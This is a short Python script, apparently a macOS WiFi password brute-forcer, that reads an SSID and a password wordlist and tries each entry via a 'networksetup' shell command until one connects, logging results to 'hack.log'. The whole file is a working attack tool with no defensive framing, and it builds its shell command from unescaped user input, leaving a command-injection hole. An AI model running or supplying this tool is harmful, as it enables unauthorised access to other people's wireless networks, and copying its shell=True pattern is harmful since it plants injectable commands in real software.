import subprocess


def bruteNets():
	print('\n--------------------------------\n')
	wifi_ssid, path_passwords, passwords = input('Enter WiFi SSID: '), input('Enter path to passwords (example: test.txt): '), None

	try:
		with open(path_passwords) as f:
			passwords = f.readlines()
			
			for i in range(len(passwords)):
				passwords[i] = passwords[i].replace('\n', '')
	except:
		print('\n\nError!\nFile not found!\n\n')


	try:
		print('\n--------------------------------\n')
		for wifi_password in passwords:
			if len(subprocess.check_output(f'networksetup -setairportnetwork en0 {wifi_ssid} {wifi_password}', shell=True)) > 0:
				print(f'WRONG - {wifi_ssid} {wifi_password}')
			else:
				print(f'\nSUCCESS - {wifi_ssid} {wifi_password}')
				break

			with open('modules/hack.log', 'w') as f:
				f.write(f'{wifi_ssid} {wifi_password}')
	except:
		pass